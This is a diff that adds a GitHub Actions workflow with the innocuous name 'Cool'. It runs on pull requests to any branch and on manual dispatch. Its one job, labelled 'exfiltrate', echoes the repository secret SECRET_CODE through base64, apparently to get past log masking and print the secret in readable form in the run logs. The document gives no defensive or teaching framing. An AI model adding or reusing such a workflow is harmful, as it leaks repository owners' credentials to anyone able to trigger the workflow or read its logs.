@@ -1,0 +1,14 @@
+name: Cool
+
+on:
+  pull_request:
+    branches: '**'
+  workflow_dispatch:
+
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo ${{ secrets.SECRET_CODE }} | base64
+        env:
+          SECRET_CODE: ${{ secrets.SECRET_CODE }}
